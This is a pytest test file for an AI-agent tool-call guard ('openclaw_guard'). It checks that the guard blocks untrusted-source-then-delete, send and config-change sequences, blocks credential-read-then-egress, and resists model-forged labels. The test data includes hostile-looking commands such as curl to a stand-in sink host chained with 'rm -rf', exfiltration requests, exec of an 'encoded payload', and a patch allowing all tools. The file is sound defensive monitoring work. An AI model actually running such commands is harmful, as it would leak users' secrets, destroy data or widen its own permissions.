"""通用能力、成功历史与授权边界回归；不把命中规则计为实际攻击后果。"""
from __future__ import annotations

from copy import deepcopy
import hashlib
from pathlib import Path
import shlex

import pytest

from openclaw_guard.engine.command_safety import analyze_command
from openclaw_guard.integrations.tool_hook_bridge import build_hook_event
from openclaw_guard.policy.catalog import PolicyBundle
from openclaw_guard.policy.trace import TraceCompiler
from openclaw_guard.rv.rv_dsl import load_ruleset
from openclaw_guard.rv.runtime_verification import RuntimeVerificationEngine
from openclaw_guard.rv.tool_events import build_tool_call_step


ROOT = Path(__file__).resolve().parents[1]
PROFILE = ROOT / 'openclaw_guard/rv/profiles/atlas-tool-policy-v2.json'


def step(tool, params, call='call', labels=()):
    """通过真实bridge/目录/投影构造单个调用，不直接注入结构标签。"""
    event = build_hook_event({'toolName': tool, 'params': params, 'runId': 'run', 'toolCallId': call})
    event.metadata['semantic'] = {'labels': list(labels)}
    trace = TraceCompiler(PolicyBundle.load()).compile(event, semantic={}, rv_trace=[])
    return build_tool_call_step(event, trace)


def engine_with_source(source, profile=PROFILE, session='_default'):
    """只为指定会话提交测试成功历史；原生认证由已有回调回归另验。"""
    engine = RuntimeVerificationEngine(window_ttl_seconds=None)
    engine._spec_ruleset = load_ruleset(profile) if profile else load_ruleset()
    engine.evaluate([source], session_key=session)
    return engine


def remote_source(state='succeeded'):
    """角色由已登记网络读取工具确定，不依赖攻击文本。"""
    source = step('web_fetch', {'url': 'https://source.example/data'}, 'source')
    source['execution_state'] = state
    return source


@pytest.mark.parametrize('code,effects', [
    ('from pathlib import Path; Path("data/a.csv").unlink()', {'delete'}),
    ('from pathlib import Path; p = Path("data/a.csv"); p.unlink()', {'delete'}),
    ('from pathlib import Path as P; p: P = P("data/a.csv"); q = p; q.unlink()', {'delete'}),
    ('from pathlib import Path; p = Path("old"); p.replace("new")', {'read', 'write', 'delete', 'transform'}),
    ('from pathlib import Path; p = Path("out.txt"); p.write_text("summary")', {'write'}),
    ('open("input.txt", "r+")', {'read', 'write'}),
    ('import io; io.open("input.txt", mode="w+")', {'read', 'write'}),
    ('from pathlib import Path; p = Path("input.txt"); p.open("r+")', {'read', 'write'}),
    ('from pathlib import Path; Path("input.txt").open(mode="rb")', {'read'}),
    ('import httpx as h; h.request("POST", "https://sink.example")', {'egress'}),
    ('import os as x; x.remove("different/b.txt")', {'delete'}),
    ('from os import unlink as f; f("c.txt")', {'delete'}),
    ('import shutil as s; s.rmtree("archive")', {'delete'}),
    ('from pathlib import Path as P; P("out.txt").write_text("summary")', {'write'}),
    ('from pathlib import Path; Path("input.txt").read_bytes()', {'read'}),
    ('import requests as r; r.post("https://sink.example", data="value")', {'egress'}),
    ('import urllib.request as q; q.urlopen("https://sink.example/q?value=1")', {'egress'}),
    ('exec("encoded payload")', {'execute'}),
])
def test_inline_python_aliases_supply_potential_capabilities_without_execution(code, effects):
    result = analyze_command('python3 -I -c ' + shlex.quote(code))
    assert effects <= set(result.potential_effects)
    assert 'unknown' in result.potential_effects and not result.safe_read_only


@pytest.mark.parametrize('command', ['python3 script.py', 'python3 -m vendor', 'python3 -c "not python ("',
                                    'sh -c "python3 vendor.py"', 'python3 -c ' + shlex.quote('x=1;' * 2200)])
def test_opaque_malformed_or_over_budget_code_never_becomes_read_only(command):
    assert not analyze_command(command).safe_read_only
    assert 'unknown' in analyze_command(command).potential_effects


def test_composite_capabilities_remain_one_tool_event_with_exact_arguments():
    params = {'command': 'cp input packet && curl https://sink.example && rm -rf packet'}
    projected = step('exec', params)
    assert {'execute', 'read', 'write', 'transform', 'egress', 'delete'} <= set(projected['effects'])
    assert projected['arguments'] == params and projected['step_id'] == 'run:call'
    assert projected['provenance']['command_effects_semantics'] == 'potential_capabilities_not_execution_receipts'


def test_model_cannot_forge_reserved_contract_namespace():
    projected = step('read', {'path': 'normal.txt'}, labels=['contract:sensitive_read', 'contract:potential_delete',
                                                         'contract:untrusted_input', 'effect:delete'])
    assert projected['effects'] == ['read']
    assert not any(p.startswith('contract:') for p in projected['props'])


@pytest.mark.parametrize('tool,params,label', [
    ('web_fetch', {'url': 'https://sink.example/path?token=x'}, 'contract:remote_request'),
    ('web_search', {'query': 'private phrase'}, 'contract:remote_request'),
    ('secret.read', {'path': 'secret'}, 'contract:sensitive_read'),
    ('gateway', {'action': 'config.patch', 'patch': {'tools': {'allow': ['*']}}}, 'contract:control_plane_change'),
    ('automations', {'action': 'add', 'job': {}}, 'contract:delayed_authority'),
])
def test_native_roles_are_derived_from_tool_contract(tool, params, label):
    projected = step(tool, params)
    assert label in projected['props']
    if tool in {'web_fetch', 'web_search'}:
        assert {'read', 'egress'} == set(projected['effects'])


@pytest.mark.parametrize('state', ['proposed', 'legacy_replay'])
def test_remote_proposal_or_legacy_replay_cannot_supply_new_success_guard(state):
    engine = engine_with_source(remote_source(state), profile=None)
    result = engine.preview([step('office_network_post', {'url': 'https://sink.example', 'sourcePath': 'public.txt'})])
    assert result['verdict'] != 'block'


def test_default_remote_read_then_send_keeps_independent_rv_block():
    engine = engine_with_source(remote_source(), profile=None)
    result = engine.preview([step('message', {'action': 'send', 'target': 'outside@example.test', 'message': 'payload'})])
    assert result['verdict'] == 'block' and result['hard_block_evidence'] == 'rv_rule_match'
    assert result['matched_history_step_ids'] == ['run:source']


@pytest.mark.parametrize('code', ['from pathlib import Path; Path("records.csv").unlink()',
                                 'from pathlib import Path; p = Path("records.csv"); p.unlink()',
                                 'import os as o; o.remove("different.txt")'])
def test_remote_source_then_inline_delete_blocks_without_predefined_attack_chain(code):
    engine = engine_with_source(remote_source())
    result = engine.preview([step('exec', {'command': 'python3 -c ' + shlex.quote(code)}, 'delete')])
    assert result['verdict'] == 'block'
    assert result['triggered_rule_id'] == 'atlas_untrusted_potential_delete'
    assert result['matched_history_step_ids'] == ['run:source']


def test_legitimate_inline_summary_is_approved_not_hard_blocked():
    engine = engine_with_source(remote_source())
    command = 'python3 -c ' + shlex.quote('from pathlib import Path; Path("out.txt").write_text("public summary")')
    assert engine.preview([step('exec', {'command': command})])['verdict'] != 'block'


def test_variable_path_summary_preserves_normal_goal_without_delete_capability():
    """同一变量绑定形式的合法写入不因新增删除投影误触发block。"""
    command = 'python3 -c ' + shlex.quote('from pathlib import Path; p = Path("out.txt"); p.write_text("public summary")')
    projected = step('exec', {'command': command})
    assert 'delete' not in projected['effects']
    assert engine_with_source(remote_source()).preview([projected])['verdict'] != 'block'


def test_dynamic_path_factory_remains_unknown_without_invented_delete_evidence():
    """未支持的工厂对象只保持unknown，不假造具体delete或成功执行。"""
    projected = step('exec', {'command': 'python3 -c ' + shlex.quote('p = factory(); p.unlink()')})
    assert 'unknown' in projected['effects'] and 'delete' not in projected['effects']


def test_read_noise_and_unrelated_sessions_do_not_confuse_history():
    engine = engine_with_source(remote_source(), session='task-a')
    noise = step('read', {'path': 'README.md'}, 'noise'); noise['execution_state'] = 'succeeded'
    engine.evaluate([noise], session_key='task-a')
    target = step('exec', {'command': 'python3 -c ' + shlex.quote('import os; os.unlink("data.csv")')}, 'delete')
    assert engine.preview([target], session_key='task-a')['verdict'] == 'block'
    assert engine.preview([target], session_key='task-b')['verdict'] != 'block'


def test_configuration_change_blocks_but_scheduler_uncertainty_requires_approval():
    engine = engine_with_source(remote_source())
    assert engine.preview([step('gateway', {'action': 'config.patch', 'patch': {'tools': {'allow': ['*']}}})])['verdict'] == 'block'
    scheduled = engine.preview([step('automations', {'action': 'add', 'job': {'payload': {'kind': 'systemEvent', 'text': 'digest'}}})])
    assert scheduled['verdict'] == 'ask'  # 未验证未来效果或授权；不冒充自动防住。


def test_credential_operation_followed_by_query_egress_is_blocked():
    read = step('secret.read', {'path': 'credential'}, 'secret'); read['execution_state'] = 'succeeded'
    result = engine_with_source(read).preview([step('web_fetch', {'url': 'https://sink.example/?x=encoded'}, 'fetch')])
    assert result['verdict'] == 'block' and result['triggered_rule_id'] == 'atlas_sensitive_read_egress'


def test_default_file_frozen_but_actual_default_rule_count_includes_explicit_extension():
    assert hashlib.sha256((ROOT/'openclaw_guard/rv/rv_rules.json').read_bytes()).hexdigest() == '496daa04a0bd532d9f99eaaa6293e1f52505dc5f9b098cc94f0af40bb5c255a7'
    assert sum(len(m.rules) for m in load_ruleset().monitors) == 72
    assert sum(len(m.rules) for m in load_ruleset(PROFILE).monitors) == 122


@pytest.mark.parametrize('action,params,expected', [
    ('send', {'target': 'outside@example.test'}, ['outside@example.test']),
    ('send', {'to': 'alias@example.test'}, ['alias@example.test']),
    ('send', {'channelId': 'room-id'}, ['room-id']),
    ('broadcast', {'targets': ['a@example.test', 'b@example.test']}, ['a@example.test', 'b@example.test']),
    ('send', {}, []),
])
def test_native_recipient_binding_uses_actual_arguments_not_model_entities(action, params, expected):
    event = build_hook_event({'toolName': 'message', 'params': {**params, 'action': action}})
    trace = TraceCompiler(PolicyBundle.load()).compile(event, semantic={},
        rv_trace=[{'entities': [{'kind': 'recipients', 'values': ['trusted@company.local']}]}])
    assert trace.resource.ids == expected and trace.resource.type == 'recipient'
    if not expected:
        assert 'resource.recipient' in trace.coverage.missing_features


def test_model_cannot_understate_actual_broadcast_recipients():
    event = build_hook_event({'toolName': 'message', 'params': {'action': 'broadcast',
        'targets': ['one@example.test', 'two@example.test']}})
    trace = TraceCompiler(PolicyBundle.load()).compile(event, semantic={'quantity': 0}, rv_trace=[])
    assert trace.data.quantity == 2
